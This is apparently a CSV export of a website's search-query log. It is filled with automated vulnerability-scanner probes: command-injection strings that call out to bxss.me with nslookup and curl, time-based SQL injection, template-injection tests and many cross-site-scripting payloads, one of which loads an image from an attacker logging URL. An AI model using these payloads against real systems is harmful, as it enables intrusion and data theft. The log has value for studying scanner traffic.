query_text,num_results,popularity,updated_at
"echo msemza$()\ axweeh\nz^xyu||a #' &echo msemza$()\ axweeh\nz^xyu||a #|"" &echo msemza$()\ axweeh\nz^xyu||a #",0,1,2024-06-11 09:09:06
"&echo xgkego$()\ mckmfq\nz^xyu||a #' &echo xgkego$()\ mckmfq\nz^xyu||a #|"" &echo xgkego$()\ mckmfq\nz^xyu||a #",0,1,2024-06-11 09:09:16
"test&echo itxhvo$()\ lbcmfq\nz^xyu||a #' &echo itxhvo$()\ lbcmfq\nz^xyu||a #|"" &echo itxhvo$()\ lbcmfq\nz^xyu||a #",0,1,2024-06-11 09:09:28
"|echo mpkxph$()\ tttfjj\nz^xyu||a #' |echo mpkxph$()\ tttfjj\nz^xyu||a #|"" |echo mpkxph$()\ tttfjj\nz^xyu||a #",0,1,2024-06-11 09:09:41
"test|echo riduky$()\ gmhdjp\nz^xyu||a #' |echo riduky$()\ gmhdjp\nz^xyu||a #|"" |echo riduky$()\ gmhdjp\nz^xyu||a #",0,1,2024-06-11 09:09:48
(nslookup -q=cname hitkzejlbpvtk4dec9.bxss.me||curl hitkzejlbpvtk4dec9.bxss.me)),0,1,2024-06-11 09:09:57
$(nslookup -q=cname hitveywjdlueofcf84.bxss.me||curl hitveywjdlueofcf84.bxss.me),0,1,2024-06-11 09:10:01
"&nslookup -q=cname hitfmhgsrglza16b6f.bxss.me&'\""`0&nslookup -q=cname hitfmhgsrglza16b6f.bxss.me&`'",0,1,2024-06-11 09:10:06
"&(nslookup -q=cname hitcuhxrgiyet64f68.bxss.me||curl hitcuhxrgiyet64f68.bxss.me)&'\""`0&(nslookup -q=cname hitcuhxrgiyet64f68.bxs",0,1,2024-06-11 09:10:19
|(nslookup -q=cname hitnrvdrmnkju1c9f3.bxss.me||curl hitnrvdrmnkju1c9f3.bxss.me),0,1,2024-06-11 09:10:32
`(nslookup -q=cname hitznkveveqpg5c030.bxss.me||curl hitznkveveqpg5c030.bxss.me)`,0,1,2024-06-11 09:10:40
;(nslookup -q=cname hitowgjpjxnmd32471.bxss.me||curl hitowgjpjxnmd32471.bxss.me)|(nslookup -q=cname hitowgjpjxnmd32471.bxss.me||,0,1,2024-06-11 09:10:47
test'&&sleep(27*1000)*xtsvuz&&',0,1,2024-06-11 09:10:59
"test""&&sleep(27*1000)*ouubmn&&""",0,1,2024-06-11 09:11:04
test'||sleep(27*1000)*hohzvo||',0,1,2024-06-11 09:11:08
"test""||sleep(27*1000)*jttkvx||""",0,1,2024-06-11 09:11:13
"test'""()&%<zzz><ScRiPt >0aDh(9620)</ScRiPt>",0,1,2024-06-11 09:58:21
"'""()&%<zzz><ScRiPt >0aDh(9099)</ScRiPt>",0,1,2024-06-11 09:58:25
test9949108,0,1,2024-06-11 09:58:30
test9949108<,0,1,2024-06-11 09:58:34
bfg5255＜s1﹥s2ʺs3ʹhjl5255,0,1,2024-06-11 09:58:37
bfgx3676??z1??z2a?bcxhjl3676,0,1,2024-06-11 09:58:44
test</title><ScRiPt >0aDh(9475)</ScRiPt>,0,1,2024-06-11 09:59:24
1BTcgkEamnO,0,1,2024-06-11 10:04:27
{{23024*23024}},0,2,2024-06-11 10:05:30
${10000144+9999742},0,1,2024-06-11 10:05:32
response.write(9347816*9779121),0,1,2024-06-11 10:07:25
'+response.write(9347816*9779121)+',0,1,2024-06-11 10:07:32
"""+response.write(9347816*9779121)+""",0,1,2024-06-11 10:07:38
"""+""A"".concat(70-3).concat(22*4).concat(104).concat(77).concat(102).concat(90)+(require""socket""
Socket.gethostbyname(""hitdt""+""nle",0,1,2024-06-11 10:09:21
"'+'A'.concat(70-3).concat(22*4).concat(112).concat(87).concat(101).concat(87)+(require'socket'
Socket.gethostbyname('hithg'+'wld",0,1,2024-06-11 10:09:34
"echo skluei$()\ acdavw\nz^xyu||a #' &echo skluei$()\ acdavw\nz^xyu||a #|"" &echo skluei$()\ acdavw\nz^xyu||a #",0,1,2024-06-11 10:09:40
"&echo lmxehj$()\ wknzov\nz^xyu||a #' &echo lmxehj$()\ wknzov\nz^xyu||a #|"" &echo lmxehj$()\ wknzov\nz^xyu||a #",0,1,2024-06-11 10:09:47
"test&echo onzyvo$()\ gtahkf\nz^xyu||a #' &echo onzyvo$()\ gtahkf\nz^xyu||a #|"" &echo onzyvo$()\ gtahkf\nz^xyu||a #",0,1,2024-06-11 10:09:52
996054,0,1,2024-06-11 10:09:54
"|echo flpfel$()\ wgkkgr\nz^xyu||a #' |echo flpfel$()\ wgkkgr\nz^xyu||a #|"" |echo flpfel$()\ wgkkgr\nz^xyu||a #",0,1,2024-06-11 10:09:56
"test|echo hnsfnt$()\ pdmayb\nz^xyu||a #' |echo hnsfnt$()\ pdmayb\nz^xyu||a #|"" |echo hnsfnt$()\ pdmayb\nz^xyu||a #",0,1,2024-06-11 10:10:00
(nslookup -q=cname hitnvnequzwkub8189.bxss.me||curl hitnvnequzwkub8189.bxss.me)),0,1,2024-06-11 10:10:03
$(nslookup -q=cname hitlndnfymtki28f45.bxss.me||curl hitlndnfymtki28f45.bxss.me),0,1,2024-06-11 10:10:09
"&nslookup -q=cname hitxhiojduckbc4cde.bxss.me&'\""`0&nslookup -q=cname hitxhiojduckbc4cde.bxss.me&`'",0,1,2024-06-11 10:10:13
"&(nslookup -q=cname hithfowaymqto17fd9.bxss.me||curl hithfowaymqto17fd9.bxss.me)&'\""`0&(nslookup -q=cname hithfowaymqto17fd9.bxs",0,1,2024-06-11 10:10:21
|(nslookup -q=cname hitlbxynbbvvvb805c.bxss.me||curl hitlbxynbbvvvb805c.bxss.me),0,1,2024-06-11 10:10:26
`(nslookup -q=cname hitzpaleizbvd95959.bxss.me||curl hitzpaleizbvd95959.bxss.me)`,0,1,2024-06-11 10:10:33
;(nslookup -q=cname hitpvrpvvgabx1b0c4.bxss.me||curl hitpvrpvvgabx1b0c4.bxss.me)|(nslookup -q=cname hitpvrpvvgabx1b0c4.bxss.me||,0,1,2024-06-11 10:10:37
'.gethostbyname(lc('hitxv'.'jrfnblxqf783d.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(114).chr(81).chr(118).chr(81).',0,1,2024-06-11 10:10:51
""".gethostbyname(lc(""hitcw"".""rjbtjcaue4abd.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(120).chr(66).chr(115).chr(66).""",0,1,2024-06-11 10:11:00
test'&&sleep(27*1000)*yqxepc&&',0,1,2024-06-11 10:12:50
"test""&&sleep(27*1000)*ervwcf&&""",0,1,2024-06-11 10:12:55
test'||sleep(27*1000)*vswswd||',0,1,2024-06-11 10:13:01
"test""||sleep(27*1000)*wxjllm||""",0,1,2024-06-11 10:13:05
testARZF24qu,0,1,2024-06-11 10:57:29
test' AND 2*3*8=6*8 AND '1AKx'='1AKx,0,1,2024-06-11 10:58:55
"test"" AND 2*3*8=6*8 AND ""dJoA""=""dJoA",0,1,2024-06-11 10:58:58
test%' AND 2*3*8=6*8 AND 'Tq8O'!='Tq8O%,0,1,2024-06-11 10:59:02
-1 OR 2+832-832-1=0+0+0+1,0,1,2024-06-11 10:59:05
-1 OR 3+832-832-1=0+0+0+1,0,1,2024-06-11 10:59:07
teste4l4GYF9'; waitfor delay '0:0:15' --,0,1,2024-06-11 11:08:26
testS3kkrTNX' OR 332=(SELECT 332 FROM PG_SLEEP(15))--,0,1,2024-06-11 11:10:47
testeZLEkUBR') OR 310=(SELECT 310 FROM PG_SLEEP(15))--,0,1,2024-06-11 11:12:57
testPZ54wYNQ')) OR 203=(SELECT 203 FROM PG_SLEEP(15))--,0,1,2024-06-11 11:14:31
@@y3jkU,0,1,2024-06-11 11:17:32
testeNWIGd9P,0,1,2024-06-11 11:50:21
test' AND 2*3*8=6*8 AND 'yiHP'='yiHP,0,1,2024-06-11 11:52:18
"test"" AND 2*3*8=6*8 AND ""jjOw""=""jjOw",0,1,2024-06-11 11:52:27
test%' AND 2*3*8=6*8 AND 'XdF6'!='XdF6%,0,1,2024-06-11 11:52:37
-1 OR 2+600-600-1=0+0+0+1,0,1,2024-06-11 11:52:40
-1 OR 3+600-600-1=0+0+0+1,0,1,2024-06-11 11:52:49
testGVtRc7zP'; waitfor delay '0:0:15' --,0,1,2024-06-11 12:01:36
testAjPBdgdT' OR 434=(SELECT 434 FROM PG_SLEEP(15))--,0,1,2024-06-11 12:03:10
testZf7crOeP') OR 994=(SELECT 994 FROM PG_SLEEP(15))--,0,1,2024-06-11 12:05:24
testAlXzNsm9')) OR 121=(SELECT 121 FROM PG_SLEEP(15))--,0,1,2024-06-11 12:07:44
@@YQbip,0,1,2024-06-11 12:10:19
{{28044*28044}},0,2,2024-06-11 12:54:11
${9999199+10000442},0,1,2024-06-11 12:54:16
"echo ebvszl$()\ ijpqik\nz^xyu||a #' &echo ebvszl$()\ ijpqik\nz^xyu||a #|"" &echo ebvszl$()\ ijpqik\nz^xyu||a #",0,1,2024-06-11 12:54:53
"&echo ndrlmi$()\ bzkvio\nz^xyu||a #' &echo ndrlmi$()\ bzkvio\nz^xyu||a #|"" &echo ndrlmi$()\ bzkvio\nz^xyu||a #",0,1,2024-06-11 12:54:59
"test&echo iisvyt$()\ sruqvy\nz^xyu||a #' &echo iisvyt$()\ sruqvy\nz^xyu||a #|"" &echo iisvyt$()\ sruqvy\nz^xyu||a #",0,1,2024-06-11 12:55:02
response.write(9424756*9805460),0,1,2024-06-11 12:55:10
"|echo gmzzfu$()\ mtkjgj\nz^xyu||a #' |echo gmzzfu$()\ mtkjgj\nz^xyu||a #|"" |echo gmzzfu$()\ mtkjgj\nz^xyu||a #",0,1,2024-06-11 12:55:11
"test|echo qrxdev$()\ ridvit\nz^xyu||a #' |echo qrxdev$()\ ridvit\nz^xyu||a #|"" |echo qrxdev$()\ ridvit\nz^xyu||a #",0,1,2024-06-11 12:55:16
(nslookup -q=cname hiteidivaxuah0b5eb.bxss.me||curl hiteidivaxuah0b5eb.bxss.me)),0,1,2024-06-11 12:55:19
'+response.write(9424756*9805460)+',0,1,2024-06-11 12:55:22
$(nslookup -q=cname hitwkusdccpnr0fee3.bxss.me||curl hitwkusdccpnr0fee3.bxss.me),0,1,2024-06-11 12:55:24
950081,0,1,2024-06-11 12:55:26
"""+response.write(9424756*9805460)+""",0,1,2024-06-11 12:55:28
"&nslookup -q=cname hitnzwoeebgnu25415.bxss.me&'\""`0&nslookup -q=cname hitnzwoeebgnu25415.bxss.me&`'",0,1,2024-06-11 12:55:32
"""+""A"".concat(70-3).concat(22*4).concat(114).concat(89).concat(111).concat(83)+(require""socket""
Socket.gethostbyname(""hitwz""+""dxa",0,1,2024-06-11 12:55:36
"&(nslookup -q=cname hitfutacoyvmt7df9f.bxss.me||curl hitfutacoyvmt7df9f.bxss.me)&'\""`0&(nslookup -q=cname hitfutacoyvmt7df9f.bxs",0,1,2024-06-11 12:55:37
"'+'A'.concat(70-3).concat(22*4).concat(120).concat(89).concat(116).concat(69)+(require'socket'
Socket.gethostbyname('hitcg'+'ufh",0,1,2024-06-11 12:55:39
|(nslookup -q=cname hithjdxcfdmkd53a2d.bxss.me||curl hithjdxcfdmkd53a2d.bxss.me),0,1,2024-06-11 12:55:42
"test'""()&%<zzz><ScRiPt >eVLT(9891)</ScRiPt>",0,1,2024-06-11 12:55:47
`(nslookup -q=cname hituzjxgscnia99d4e.bxss.me||curl hituzjxgscnia99d4e.bxss.me)`,0,1,2024-06-11 12:55:49
"'""()&%<zzz><ScRiPt >eVLT(9418)</ScRiPt>",0,1,2024-06-11 12:55:53
;(nslookup -q=cname hitvgdesoshoo554fc.bxss.me||curl hitvgdesoshoo554fc.bxss.me)|(nslookup -q=cname hitvgdesoshoo554fc.bxss.me||,0,1,2024-06-11 12:55:54
test9969715,0,1,2024-06-11 12:55:59
'.gethostbyname(lc('hitbn'.'fgmmtdnre492c.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(106).chr(86).chr(97).chr(66).',0,1,2024-06-11 12:56:00
test9969715<,0,1,2024-06-11 12:56:03
""".gethostbyname(lc(""hitzc"".""ywxxvjggf54ac.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(105).chr(87).chr(111).chr(78).""",0,1,2024-06-11 12:56:05
bfg3792＜s1﹥s2ʺs3ʹhjl3792,0,1,2024-06-11 12:56:09
bfgx5560??z1??z2a?bcxhjl5560,0,1,2024-06-11 12:56:12
test'&&sleep(27*1000)*nnalkb&&',0,1,2024-06-11 12:56:18
"test""&&sleep(27*1000)*lkdypb&&""",0,1,2024-06-11 12:56:23
test'||sleep(27*1000)*qgtnrl||',1,1,2024-06-11 12:56:26
"test""||sleep(27*1000)*lnfiwx||""",1,1,2024-06-11 12:56:31
bfg10400＜s1﹥s2ʺs3ʹhjl10400,0,1,2024-06-11 12:56:43
bfgx9378??z1??z2a?bcxhjl9378,0,1,2024-06-11 12:56:48
bfg6129＜s1﹥s2ʺs3ʹhjl6129,0,1,2024-06-11 12:57:37
bfgx7603??z1??z2a?bcxhjl7603,0,1,2024-06-11 12:57:40
bfg5486＜s1﹥s2ʺs3ʹhjl5486,0,1,2024-06-11 12:58:14
bfgx1729??z1??z2a?bcxhjl1729,0,1,2024-06-11 12:58:17
bfg1563＜s1﹥s2ʺs3ʹhjl1563,0,1,2024-06-11 12:58:47
bfgx2078??z1??z2a?bcxhjl2078,0,1,2024-06-11 12:58:52
testZB2oQzGd,0,1,2024-06-11 12:59:12
bfg8035＜s1﹥s2ʺs3ʹhjl8035,0,1,2024-06-11 12:59:23
bfgx4004??z1??z2a?bcxhjl4004,0,1,2024-06-11 12:59:26
bfg5376＜s1﹥s2ʺs3ʹhjl5376,0,1,2024-06-11 13:00:03
bfgx3497??z1??z2a?bcxhjl3497,0,1,2024-06-11 13:00:09
bfg7557＜s1﹥s2ʺs3ʹhjl7557,0,1,2024-06-11 13:00:34
bfgx9978??z1??z2a?bcxhjl9978,0,1,2024-06-11 13:00:43
test' AND 2*3*8=6*8 AND 'sxgN'='sxgN,0,1,2024-06-11 13:01:12
"test"" AND 2*3*8=6*8 AND ""0ihq""=""0ihq",0,1,2024-06-11 13:01:24
bfg6236＜s1﹥s2ʺs3ʹhjl6236,0,1,2024-06-11 13:01:25
bfgx4261??z1??z2a?bcxhjl4261,0,1,2024-06-11 13:01:29
test%' AND 2*3*8=6*8 AND 'PgTw'!='PgTw%,0,1,2024-06-11 13:01:29
-1 OR 2+173-173-1=0+0+0+1,0,1,2024-06-11 13:01:39
-1 OR 3+173-173-1=0+0+0+1,0,1,2024-06-11 13:01:42
test</title><ScRiPt >eVLT(9032)</ScRiPt>,0,1,2024-06-11 13:02:07
"test9979""();}]9024",0,1,2024-06-11 13:02:10
%74%65%73%74%39%37%35%34%22%28%29%3B%7D%5D%39%31%35%39,0,1,2024-06-11 13:02:13
test</script><script>eVLT(9654)</script>,0,1,2024-06-11 13:02:25
"test""onmouseover=eVLT(94792)""",0,1,2024-06-11 13:02:30
"test""onmouseover=eVLT(91102)""",0,1,2024-06-11 13:02:33
"test"" ta1v=eVLT([!+!]) 7kS=""",0,1,2024-06-11 13:02:35
test\u0022onmouseover=eVLT(93523)\u0022,0,1,2024-06-11 13:02:42
%74%65%73%74%22%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%65%56%4C%54%28%39%35%36%35%34%29%22,0,1,2024-06-11 13:02:46
"?""onmouseover=eVLT(93835)//",0,1,2024-06-11 13:02:50
"test""sTYLe='zzz:Expre/**/SSion(eVLT(9408))'bad=""",0,1,2024-06-11 13:02:53
"test""><script>eVLT(9670)</script>",0,1,2024-06-11 13:02:58
test<ScRiPt >eVLT(9701)</ScRiPt>,0,1,2024-06-11 13:03:01
test<WJYJOK>EQGXL[!+!]</WJYJOK>,0,1,2024-06-11 13:03:05
test<script>eVLT(9728)</script>,0,1,2024-06-11 13:03:09
test<script>eVLT(9911)</script>9911,0,1,2024-06-11 13:03:13
test<ScR<ScRiPt>IpT>eVLT(9078)</sCr<ScRiPt>IpT>,0,1,2024-06-11 13:03:20
"test<ScRiPt 
>eVLT(9274)</ScRiPt>",0,1,2024-06-11 13:03:22
test<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9189></ScRiPt>,0,1,2024-06-11 13:03:27
"test< ScRiPt 
>eVLT(9522)</ScRiPt>",0,1,2024-06-11 13:03:34
"test<svg	
? onload=eVLT(9088);>",0,1,2024-06-11 13:03:37
test<isindex type=image src=1 onerror=eVLT(9887)>,0,1,2024-06-11 13:03:40
"test<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9354'>",0,1,2024-06-11 13:03:43
test<body onload=eVLT(9206)>,0,1,2024-06-11 13:03:47
test<img src=//xss.bxss.me/t/dot.gif onload=eVLT(9483)>,0,1,2024-06-11 13:03:49
test<img src=xyz OnErRor=eVLT(9489)>,0,1,2024-06-11 13:03:52
"test<img/src="">"" onerror=alert(9424)>",0,1,2024-06-11 13:03:55
%74%65%73%74%3C%53%63%52%69%50%74%20%3E%65%56%4C%54%289607%29%3C%2F%73%43%72%69%70%54%3E,0,1,2024-06-11 13:03:57
test\u003CScRiPt\eVLT(9837)\u003C/sCripT\u003E,0,1,2024-06-11 13:04:01
test&lt;ScRiPt&gt;eVLT(9870)&lt;/sCripT&gt;,0,1,2024-06-11 13:04:04
?<img zzz onmouseover=eVLT(92631) //?>,0,1,2024-06-11 13:04:09
test<input autofocus onfocus=eVLT(9333)>,0,1,2024-06-11 13:04:12
test}body{zzz:Expre/**/SSion(eVLT(9625))},0,1,2024-06-11 13:04:21
"testoOUC2
<ScRiPt >eVLT(9117)</ScRiPt>",0,1,2024-06-11 13:04:24
test<WGEABB>DRAK5[!+!]</WGEABB>,0,1,2024-06-11 13:04:28
test<ifRAme sRc=9638.com></IfRamE>,0,1,2024-06-11 13:04:31
test<agyFqhu x=9900>,0,1,2024-06-11 13:04:34
test<img sRc='http://attacker-9649/log.php?,0,2,2024-06-12 00:11:50
test<aEbzOUu<,0,1,2024-06-11 13:04:40
test8TTv9H9O'; waitfor delay '0:0:15' --,0,1,2024-06-11 13:10:14
testvIAqgYXH' OR 715=(SELECT 715 FROM PG_SLEEP(15))--,0,1,2024-06-11 13:11:41
test6VytJAQ1') OR 212=(SELECT 212 FROM PG_SLEEP(15))--,0,1,2024-06-11 13:13:01
testnIY08sJl')) OR 656=(SELECT 656 FROM PG_SLEEP(15))--,0,1,2024-06-11 13:14:12
@@0sEeU,0,1,2024-06-11 13:15:38
{{65175*65175}},0,2,2024-06-11 17:26:43
${10000375+10000406},0,1,2024-06-11 17:27:05
"echo bwdoag$()\ yrwxov\nz^xyu||a #' &echo bwdoag$()\ yrwxov\nz^xyu||a #|"" &echo bwdoag$()\ yrwxov\nz^xyu||a #",0,1,2024-06-11 17:27:27
"&echo wfwnyf$()\ ufbhya\nz^xyu||a #' &echo wfwnyf$()\ ufbhya\nz^xyu||a #|"" &echo wfwnyf$()\ ufbhya\nz^xyu||a #",0,1,2024-06-11 17:27:39
"test&echo mqzrsi$()\ wqhpbv\nz^xyu||a #' &echo mqzrsi$()\ wqhpbv\nz^xyu||a #|"" &echo mqzrsi$()\ wqhpbv\nz^xyu||a #",0,1,2024-06-11 17:27:44
response.write(9716001*9225172),0,1,2024-06-11 17:27:44
'+response.write(9716001*9225172)+',0,1,2024-06-11 17:27:54
"""+response.write(9716001*9225172)+""",0,1,2024-06-11 17:27:58
"|echo rewmyk$()\ akxiiy\nz^xyu||a #' |echo rewmyk$()\ akxiiy\nz^xyu||a #|"" |echo rewmyk$()\ akxiiy\nz^xyu||a #",0,1,2024-06-11 17:27:59
957499,0,1,2024-06-11 17:28:02
"test|echo iirrsw$()\ wlvlvy\nz^xyu||a #' |echo iirrsw$()\ wlvlvy\nz^xyu||a #|"" |echo iirrsw$()\ wlvlvy\nz^xyu||a #",0,1,2024-06-11 17:28:02
(nslookup -q=cname hitmiiypudnhrb6370.bxss.me||curl hitmiiypudnhrb6370.bxss.me)),0,1,2024-06-11 17:28:07
"""+""A"".concat(70-3).concat(22*4).concat(122).concat(74).concat(120).concat(68)+(require""socket""
Socket.gethostbyname(""hitwc""+""mie",0,1,2024-06-11 17:28:10
"'+'A'.concat(70-3).concat(22*4).concat(118).concat(80).concat(104).concat(77)+(require'socket'
Socket.gethostbyname('hittb'+'pdu",0,1,2024-06-11 17:28:15
$(nslookup -q=cname hitkeuartawhec52d5.bxss.me||curl hitkeuartawhec52d5.bxss.me),0,1,2024-06-11 17:28:18
"test'""()&%<zzz><ScRiPt >Qw7V(9303)</ScRiPt>",0,1,2024-06-11 17:28:22
"&nslookup -q=cname hitsuhohbueupe0a38.bxss.me&'\""`0&nslookup -q=cname hitsuhohbueupe0a38.bxss.me&`'",0,1,2024-06-11 17:28:24
'.gethostbyname(lc('hitjw'.'utnnbbgd0298e.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(115).chr(65).chr(107).chr(88).',0,1,2024-06-11 17:28:25
"'""()&%<zzz><ScRiPt >Qw7V(9591)</ScRiPt>",0,1,2024-06-11 17:28:25
"&(nslookup -q=cname hiteokuqjgdxx3e0c2.bxss.me||curl hiteokuqjgdxx3e0c2.bxss.me)&'\""`0&(nslookup -q=cname hiteokuqjgdxx3e0c2.bxs",0,1,2024-06-11 17:28:27
test9974814,0,1,2024-06-11 17:28:30
|(nslookup -q=cname hitvhvkakqhyk826e8.bxss.me||curl hitvhvkakqhyk826e8.bxss.me),0,1,2024-06-11 17:28:32
""".gethostbyname(lc(""hiteb"".""kveiuyqgdacaa.bxss.me."")).""A"".chr(67).chr(hex(""58"")).chr(112).chr(89).chr(98).chr(66).""",0,1,2024-06-11 17:28:33
`(nslookup -q=cname hitinllnpdagod38bf.bxss.me||curl hitinllnpdagod38bf.bxss.me)`,0,1,2024-06-11 17:28:37
test9974814<,0,1,2024-06-11 17:28:39
;(nslookup -q=cname hitigkyvflffl053e8.bxss.me||curl hitigkyvflffl053e8.bxss.me)|(nslookup -q=cname hitigkyvflffl053e8.bxss.me||,0,1,2024-06-11 17:28:44
test'&&sleep(27*1000)*vudllo&&',0,1,2024-06-11 17:28:47
bfg7468＜s1﹥s2ʺs3ʹhjl7468,0,1,2024-06-11 17:28:53
"test""&&sleep(27*1000)*fwulxf&&""",0,1,2024-06-11 17:28:55
bfgx6292??z1??z2a?bcxhjl6292,0,1,2024-06-11 17:28:58
test'||sleep(27*1000)*kbfwrm||',0,1,2024-06-11 17:29:00
"test""||sleep(27*1000)*vktlrk||""",0,1,2024-06-11 17:29:03
bfg4291＜s1﹥s2ʺs3ʹhjl4291,0,1,2024-06-11 17:29:54
bfgx1873??z1??z2a?bcxhjl1873,0,1,2024-06-11 17:29:57
bfg9904＜s1﹥s2ʺs3ʹhjl9904,0,1,2024-06-11 17:30:32
bfgx4446??z1??z2a?bcxhjl4446,0,1,2024-06-11 17:30:54
bfg6762＜s1﹥s2ʺs3ʹhjl6762,0,1,2024-06-11 17:31:54
bfgx2879??z1??z2a?bcxhjl2879,0,1,2024-06-11 17:31:56
bfg10134＜s1﹥s2ʺs3ʹhjl10134,0,1,2024-06-11 17:32:32
bfgx2162??z1??z2a?bcxhjl2162,0,1,2024-06-11 17:32:35
bfg8085＜s1﹥s2ʺs3ʹhjl8085,0,1,2024-06-11 17:33:10
bfgx4939??z1??z2a?bcxhjl4939,0,1,2024-06-11 17:33:16
test5bJ2H9fg,0,1,2024-06-11 17:34:01
bfg9605＜s1﹥s2ʺs3ʹhjl9605,0,1,2024-06-11 17:34:12
bfgx5783??z1??z2a?bcxhjl5783,0,1,2024-06-11 17:34:16
bfg6280＜s1﹥s2ʺs3ʹhjl6280,0,1,2024-06-11 17:34:58
bfgx8779??z1??z2a?bcxhjl8779,0,1,2024-06-11 17:35:01
bfg4182＜s1﹥s2ʺs3ʹhjl4182,0,1,2024-06-11 17:35:38
test' AND 2*3*8=6*8 AND 'CX0b'='CX0b,0,1,2024-06-11 17:35:42
bfgx4783??z1??z2a?bcxhjl4783,0,1,2024-06-11 17:35:45
"test"" AND 2*3*8=6*8 AND ""1uNQ""=""1uNQ",0,1,2024-06-11 17:35:46
test%' AND 2*3*8=6*8 AND 'UFPc'!='UFPc%,0,1,2024-06-11 17:35:53
-1 OR 2+421-421-1=0+0+0+1,0,1,2024-06-11 17:35:59
-1 OR 3+421-421-1=0+0+0+1,0,1,2024-06-11 17:36:07
test</title><ScRiPt >Qw7V(9403)</ScRiPt>,0,1,2024-06-11 17:36:28
"test9923""();}]9020",0,1,2024-06-11 17:36:34
%74%65%73%74%39%38%30%32%22%28%29%3B%7D%5D%39%32%38%38,0,1,2024-06-11 17:36:41
test</script><script>Qw7V(9458)</script>,0,1,2024-06-11 17:36:45
"test""onmouseover=Qw7V(99312)""",0,1,2024-06-11 17:37:07
"test""onmouseover=Qw7V(94952)""",0,1,2024-06-11 17:37:11
"test"" ufh4=Qw7V([!+!]) 0ZU=""",0,1,2024-06-11 17:37:18
test\u0022onmouseover=Qw7V(96143)\u0022,0,1,2024-06-11 17:37:30
%74%65%73%74%22%6F%6E%6D%6F%75%73%65%6F%76%65%72%3D%51%77%37%56%28%39%30%31%30%34%29%22,0,1,2024-06-11 17:37:35
"?""onmouseover=Qw7V(91715)//",0,1,2024-06-11 17:37:41
"test""sTYLe='zzz:Expre/**/SSion(Qw7V(9898))'bad=""",0,1,2024-06-11 17:37:56
"test""><script>Qw7V(9431)</script>",0,1,2024-06-11 17:38:02
test<ScRiPt >Qw7V(9967)</ScRiPt>,0,1,2024-06-11 17:38:06
test<WDJCCY>7XG1Z[!+!]</WDJCCY>,0,1,2024-06-11 17:38:10
test<script>Qw7V(9131)</script>,0,1,2024-06-11 17:38:15
test<script>Qw7V(9463)</script>9463,0,1,2024-06-11 17:38:26
test<ScR<ScRiPt>IpT>Qw7V(9058)</sCr<ScRiPt>IpT>,0,1,2024-06-11 17:38:32
"test<ScRiPt 
>Qw7V(9398)</ScRiPt>",0,1,2024-06-11 17:38:39
test<ScRiPt/zzz src=//xss.bxss.me/t/xss.js?9615></ScRiPt>,0,1,2024-06-11 17:38:46
"test< ScRiPt 
>Qw7V(9520)</ScRiPt>",0,1,2024-06-11 17:38:50
"test<svg	
? onload=Qw7V(9715);>",0,1,2024-06-11 17:38:54
test<isindex type=image src=1 onerror=Qw7V(9794)>,0,1,2024-06-11 17:39:05
"test<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnYWN1bmV0aXgteHNzLXRlc3QnKTwvc2NyaXB0Pgo=' invalid='9839'>",0,1,2024-06-11 17:39:19
test<body onload=Qw7V(9928)>,0,1,2024-06-11 17:39:23
test<img src=//xss.bxss.me/t/dot.gif onload=Qw7V(9893)>,0,1,2024-06-11 17:39:29
test<img src=xyz OnErRor=Qw7V(9325)>,0,1,2024-06-11 17:39:40
"test<img/src="">"" onerror=alert(9467)>",0,1,2024-06-11 17:39:43
%74%65%73%74%3C%53%63%52%69%50%74%20%3E%51%77%37%56%289877%29%3C%2F%73%43%72%69%70%54%3E,0,1,2024-06-11 17:39:55
test\u003CScRiPt\Qw7V(9610)\u003C/sCripT\u003E,0,1,2024-06-11 17:40:04
test&lt;ScRiPt&gt;Qw7V(9009)&lt;/sCripT&gt;,0,1,2024-06-11 17:40:07
?<img zzz onmouseover=Qw7V(90441) //?>,0,1,2024-06-11 17:40:29
test<input autofocus onfocus=Qw7V(9410)>,0,1,2024-06-11 17:40:39
test}body{zzz:Expre/**/SSion(Qw7V(9900))},0,1,2024-06-11 17:40:55
"testc3iZL
<ScRiPt >Qw7V(9823)</ScRiPt>",0,1,2024-06-11 17:41:02
test<WPV5TW>00QK4[!+!]</WPV5TW>,0,1,2024-06-11 17:41:09
